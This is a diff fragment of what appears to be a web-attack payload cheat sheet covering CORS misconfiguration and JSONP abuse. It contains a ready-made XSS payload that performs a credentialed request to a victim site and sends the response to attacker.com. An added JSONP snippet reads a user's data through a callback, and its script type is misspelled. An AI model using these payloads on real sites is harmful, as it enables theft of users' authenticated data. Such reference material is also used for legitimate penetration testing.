@@ -95,3 +95,16 @@ Access-Control-Allow-Credentials: true
     document.location="http://subdomain.vulnerable.com/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://vulnerable.com/details',true); req.withCredentials = true;req.send();function reqListener() {location='https://attacker.com/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
 ```
+
+<br />
+
+## JSONP (Json with Padding)
+
+```html
+<script>
+	var userinfo = function (data) {
+		alert(JSON.stringify(data));
+	}
+</script>
+<script src="https://vulnerable.com/example.php?value=userinfo" type="text/javascriipt"></script>
+```
